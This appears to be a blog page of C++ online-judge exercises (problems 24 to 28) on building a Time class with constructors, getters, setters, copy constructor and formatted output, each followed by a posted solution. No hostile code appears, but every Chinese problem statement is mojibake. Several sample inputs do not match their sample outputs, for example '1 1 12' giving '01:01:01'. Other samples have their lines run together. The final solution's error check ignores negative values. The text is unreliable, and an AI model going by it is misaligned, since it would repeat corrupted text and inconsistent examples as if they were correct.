<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-23"><a href="#Input-23" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨åˆæ³•çš„æ—¶é—´èŒƒå›´å†…ã€‚</p>
<h2 id="Output-23"><a href="#Output-23" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€ç»„è¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¾“å‡ºéœ€è¦å‰é¢è¡¥0ï¼Œæ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-23"><a href="#Sample-Input-23" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>5</p>
<p>0 0 1</p>
<p>0 59 59</p>
<p>1 1 12</p>
<p>3 0 02</p>
<p>3 59 59</p>
<h2 id="Sample-Output-23"><a href="#Sample-Output-23" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:01</p>
<p>00:59:59</p>
<p>01:01:01</p>
<p>23:00:00</p>
<p>23:59:59</p>
<h2 id="HINT-23"><a href="#HINT-23" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-23"><a href="#Append-Code-23" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1385&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time(int hh,int mm,int ss):h(hh),m(mm),s(ss)&#123;&#125;
    void showTime()&#123;
        cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
    &#125;
&#125;;
////////////////////////////////
int main()
&#123;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        int hour, minute, second;
        cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
        Time t(hour, minute, second);
        t.showTime();
    &#125;
&#125;</code></pre>
<blockquote>
<p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
</blockquote>
<h3 id="25-æ—¶é—´ç±»çš„æˆå‘˜è¯»å†™"><a href="#25-æ—¶é—´ç±»çš„æˆå‘˜è¯»å†™" class="headerlink" title="25.æ—¶é—´ç±»çš„æˆå‘˜è¯»å†™"></a>25.æ—¶é—´ç±»çš„æˆå‘˜è¯»å†™</h3><blockquote>
<h2 id="Description-24"><a href="#Description-24" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œç”¨äºæ—¶é—´å¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Time::Time()æ— å‚æ„é€ æ–¹æ³•ã€‚</p>
<p>\2. æˆå‘˜è¯»å‡½æ•°ï¼š</p>
<p>   Time::hour()  ï¼šè¿”å›Timeçš„å°æ—¶æ•°ï¼›</p>
<p>   Time::minute()ï¼šè¿”å›Timeçš„åˆ†é’Ÿæ•°ï¼›</p>
<p>   Time::second()ï¼šè¿”å›Timeçš„ç§’æ•°ã€‚</p>
<p>\3. æˆå‘˜å†™å‡½æ•°ï¼š</p>
<p>   Time::hour(int)  ï¼šä¼ å‚ä¿®æ”¹Timeçš„å°æ—¶æ•°ï¼›</p>
<p>   Time::minute(int)ï¼šä¼ å‚ä¿®æ”¹Timeçš„åˆ†é’Ÿæ•°ï¼›</p>
<p>   Time::second(int)ï¼šä¼ å‚ä¿®æ”¹Timeçš„ç§’æ•°ã€‚</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-24"><a href="#Input-24" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨åˆæ³•çš„æ—¶é—´èŒƒå›´å†…ã€‚</p>
<h2 id="Output-24"><a href="#Output-24" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€ç»„è¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¾“å‡ºéœ€è¦å‰é¢è¡¥0ï¼Œæ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-24"><a href="#Sample-Input-24" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>5</p>
<p>0 0 1</p>
<p>0 59 59</p>
<p>1 1 12</p>
<p>3 0 02</p>
<p>3 59 59</p>
<h2 id="Sample-Output-24"><a href="#Sample-Output-24" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:01</p>
<p>00:59:59</p>
<p>01:01:01</p>
<p>23:00:00</p>
<p>23:59:59</p>
<h2 id="HINT-24"><a href="#HINT-24" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-24"><a href="#Append-Code-24" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1386&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time()&#123;&#125;
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;
    int hour()&#123;return h;&#125;
    int minute()&#123;return m;&#125;
    int second()&#123;return s;&#125;
&#125;;
////////////////////////////////
int main()
&#123;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        int hour, minute, second;
        cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
        t.hour(hour);
        t.minute(minute);
        t.second(second);
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;t.hour()&lt;&lt;&quot;:&quot;;
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;t.minute()&lt;&lt;&quot;:&quot;;
        cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;t.second()&lt;&lt;endl;
    &#125;
&#125;</code></pre>
<h3 id="26-æ—¶é—´ç±»çš„è¾“å…¥"><a href="#26-æ—¶é—´ç±»çš„è¾“å…¥" class="headerlink" title="* 26.æ—¶é—´ç±»çš„è¾“å…¥"></a>* 26.æ—¶é—´ç±»çš„è¾“å…¥</h3><p>Description</p>
<blockquote>
<h2 id="Description-25"><a href="#Description-25" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œç”¨äºæ—¶é—´å¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Time::Time()æ— å‚æ„é€ æ–¹æ³•ã€‚</p>
<p>\2. Time::inputTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°å€¼ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>\3. Time::showTime()æ–¹æ³•ï¼šè¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¦å‰é¢è¡¥0ã€‚</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-25"><a href="#Input-25" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨åˆæ³•çš„æ—¶é—´èŒƒå›´å†…ã€‚</p>
<h2 id="Output-25"><a href="#Output-25" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€ç»„è¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¾“å‡ºéœ€è¦å‰é¢è¡¥0ï¼Œæ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-25"><a href="#Sample-Input-25" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>50 0 10 59 591 1 123 0 023 59 59</p>
<h2 id="Sample-Output-25"><a href="#Sample-Output-25" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:0100:59:5901:01:0123:00:0023:59:59</p>
<h2 id="HINT-25"><a href="#HINT-25" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-25"><a href="#Append-Code-25" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1387&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time()&#123;&#125;
    Time(int hh, int mm, int ss) : s(ss), m(mm), h(hh) &#123; &#125;  
    Time&amp; inputTime()  
    &#123;  
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s;  
        return *this;  
    &#125;      
    void showTime()&#123;
        cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
    &#125;
&#125;;
///////////////////////////
int main()
&#123;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
        t.inputTime().showTime();
&#125;</code></pre>
<h3 id="27-æ—¶é—´ç±»çš„æ‹·è´å’Œæ•´ä½“è¯»å†™"><a href="#27-æ—¶é—´ç±»çš„æ‹·è´å’Œæ•´ä½“è¯»å†™" class="headerlink" title="27.æ—¶é—´ç±»çš„æ‹·è´å’Œæ•´ä½“è¯»å†™"></a>27.æ—¶é—´ç±»çš„æ‹·è´å’Œæ•´ä½“è¯»å†™</h3><blockquote>
<h2 id="Description-26"><a href="#Description-26" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œç”¨äºæ—¶é—´å¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Time::Time()æ— å‚æ„é€ æ–¹æ³•ã€‚</p>
<p>\2. Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’çš„ä¸‰ä¸ªå‚æ•°æ„é€ å¯¹è±¡ã€‚</p>
<p>\3. Time::Time(const T&amp;)æ‹·è´æ„é€ æ–¹æ³•ã€‚æ‹·è´æ„é€ å‡½æ•°è°ƒç”¨æ—¶è¾“å‡ºâ€œThere was a call to the copy constructor : h,m,sâ€ï¼Œâ€œh,m,sâ€ä¸ºæ‰€æ„é€ å¯¹è±¡çš„æ—¶åˆ†ç§’æ•°å€¼ï¼Œæ— éœ€è¡¥0ã€‚</p>
<p>\4. å¯¹è±¡æ•´ä½“è¯»å†™æ–¹æ³•ï¼š</p>
<p>   Time::setTime(int,int,int)æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’ä¸‰ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::setTime(const T&amp;)æ–¹æ³•ï¼šä¼ é€’ä¸€ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::getTime()æ–¹æ³•ï¼šè¿”å›å¯¹è±¡è‡ªèº«çš„å¼•ç”¨ã€‚å…¶å®ï¼Œt.getTime()å³tã€‚</p>
<p>   ä»…åœ¨Timeç±»ä¸­çš„Time::getTime()æ–¹æ³•å®åœ¨æ˜¯å¤šä½™ï¼Œåœ¨ç»„åˆæˆ–è€…ç»§æ‰¿å…³ç³»æ—¶æ‰ä¼šæœ‰æœºä¼šç”¨åˆ°ã€‚</p>
<p>\5. Time::showTime()æ–¹æ³•ï¼šè¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¦å‰é¢è¡¥0ã€‚</p>
<p>æ³¨æ„ï¼šåœ¨ç”¨Timeå¯¹è±¡ä¼ é€’å‚æ•°æ—¶åº”ä¼ å¯¹è±¡çš„å¼•ç”¨è€Œä¸æ˜¯ç›´æ¥ä¼ å¯¹è±¡ï¼Œè¿”å›å¯¹è±¡æ—¶åŒæ ·è¿”å›å¼•ç”¨ï¼Œä»¥å…äº§ç”Ÿå¤šä½™çš„å¯¹è±¡æ‹·è´ã€‚</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚main()å‡½æ•°å†…å®¹ç¨å¾®ç¹å¤ï¼Œä»…ä¸ºæµ‹è¯•å¯¹è±¡çš„å„ç§è°ƒç”¨æƒ…å†µã€‚</p>
<h2 id="Input-26"><a href="#Input-26" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨åˆæ³•çš„æ—¶é—´èŒƒå›´å†…ã€‚</p>
<h2 id="Output-26"><a href="#Output-26" class="headerlink" title="Output"></a>Output</h2><p>å¼€å§‹éƒ¨åˆ†ä¸ºç”±main()å‡½æ•°äº§ç”Ÿçš„å›ºå®šè¾“å‡ºï¼Œç”¨äºæµ‹è¯•å¯¹è±¡çš„æŸäº›æ–¹æ³•çš„è°ƒç”¨æƒ…å†µã€‚è¾“å‡ºâ€œTest data output :â€ä¹‹åä¸ºæµ‹è¯•æ•°æ®å¯¹åº”çš„è¾“å‡ºï¼š</p>
<p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€ç»„è¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¾“å‡ºéœ€è¦å‰é¢è¡¥0ï¼Œæ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-26"><a href="#Sample-Input-26" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>50 0 10 59 591 1 123 0 023 59 59</p>
<h2 id="Sample-Output-26"><a href="#Sample-Output-26" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Copy constructor test output :There was a call to the copy constructor : 0,0,0There was a call to the copy constructor : 1,2,3Test data output :00:00:0100:59:5901:01:0123:00:0023:59:59</p>
<h2 id="HINT-26"><a href="#HINT-26" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-26"><a href="#Append-Code-26" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1388&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss) : s(ss), m(mm), h(hh) &#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    Time &amp;getTime()  
    &#123;  
        return *this;  
    &#125;  
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime()&#123;
        cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
    &#125;      
&#125;;
///////////////////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Copy constructor test output :&quot;&lt;&lt;endl;
    Time t;
    Time tt(t);
    Time ttt(1, 2, 3);
    Time tttt(ttt.getTime());
    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;

    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        if(i % 2 == 0)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.setTime(hour, minute, second).showTime();
        &#125;
        if(i % 2 == 1)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            Time tt(hour, minute, second);
            t.setTime(tt).showTime();
        &#125;
    &#125;
&#125;</code></pre>
<h3 id="28-æ—¶é—´ç±»çš„é”™è¯¯æ•°æ®å¤„ç†"><a href="#28-æ—¶é—´ç±»çš„é”™è¯¯æ•°æ®å¤„ç†" class="headerlink" title="28.æ—¶é—´ç±»çš„é”™è¯¯æ•°æ®å¤„ç†"></a>28.æ—¶é—´ç±»çš„é”™è¯¯æ•°æ®å¤„ç†</h3><blockquote>
<h2 id="Description-27"><a href="#Description-27" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œç”¨äºæ—¶é—´å¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Time::Time()æ— å‚æ„é€ æ–¹æ³•ã€‚</p>
<p>\2. Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’çš„ä¸‰ä¸ªå‚æ•°æ„é€ å¯¹è±¡ã€‚</p>
<p>\3. Time::Time(const T&amp;)æ‹·è´æ„é€ æ–¹æ³•ã€‚</p>
<p>\4. æˆå‘˜è¯»å‡½æ•°ï¼š</p>
<p>   Time::hour()  ï¼šè¿”å›Timeçš„å°æ—¶æ•°ï¼›</p>
<p>   Time::minute()ï¼šè¿”å›Timeçš„åˆ†é’Ÿæ•°ï¼›</p>
<p>   Time::second()ï¼šè¿”å›Timeçš„ç§’æ•°ã€‚</p>
<p>\5. æˆå‘˜å†™å‡½æ•°ï¼š</p>
<p>   Time::hour(int)  ï¼šä¼ å‚ä¿®æ”¹Timeçš„å°æ—¶æ•°ï¼›</p>
<p>   Time::minute(int)ï¼šä¼ å‚ä¿®æ”¹Timeçš„åˆ†é’Ÿæ•°ï¼›</p>
<p>   Time::second(int)ï¼šä¼ å‚ä¿®æ”¹Timeçš„ç§’æ•°ã€‚</p>
<p>\6. å¯¹è±¡æ•´ä½“è¯»å†™æ–¹æ³•ï¼š</p>
<p>   Time::setTime(int,int,int)æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’ä¸‰ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::setTime(const T&amp;)æ–¹æ³•ï¼šä¼ é€’ä¸€ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::getTime()æ–¹æ³•ï¼šè¿”å›å¯¹è±¡è‡ªèº«çš„å¼•ç”¨ã€‚å…¶å®ï¼Œt.getTime()å³tã€‚</p>
<p>   ä»…åœ¨Timeç±»ä¸­çš„Time::getTime()æ–¹æ³•å®åœ¨æ˜¯å¤šä½™ï¼Œåœ¨ç»„åˆæˆ–è€…ç»§æ‰¿å…³ç³»æ—¶æ‰ä¼šæœ‰æœºä¼šç”¨åˆ°ã€‚</p>
<p>\7. Time::inputTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°å€¼ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>\8. Time::showTime()æ–¹æ³•ï¼šè¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¦å‰é¢è¡¥0ã€‚å¦‚æœå¯¹è±¡ä¸æ˜¯åˆæ³•çš„æ—¶é—´ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚main()å‡½æ•°å†…å®¹ç¨å¾®ç¹å¤ï¼Œä»…ä¸ºæµ‹è¯•å¯¹è±¡çš„å„ç§è°ƒç”¨æƒ…å†µã€‚</p>
<h2 id="Input-27"><a href="#Input-27" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨intèŒƒå›´å†…ã€‚</p>
<h2 id="Output-27"><a href="#Output-27" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€ç»„è¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¾“å‡ºéœ€è¦å‰é¢è¡¥0ã€‚å¦‚æœè¾“å…¥çš„æ—¶é—´ä¸åˆæ³•ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚æ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-27"><a href="#Sample-Input-27" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-27"><a href="#Sample-Output-27" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:0100:59:59Time error23:00:0023:59:59Time error</p>
<h2 id="HINT-27"><a href="#HINT-27" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-27"><a href="#Append-Code-27" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1389&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
public:
    int h,m,s;
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss) : s(ss), m(mm), h(hh) &#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    Time &amp;getTime()  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime()&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123;
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
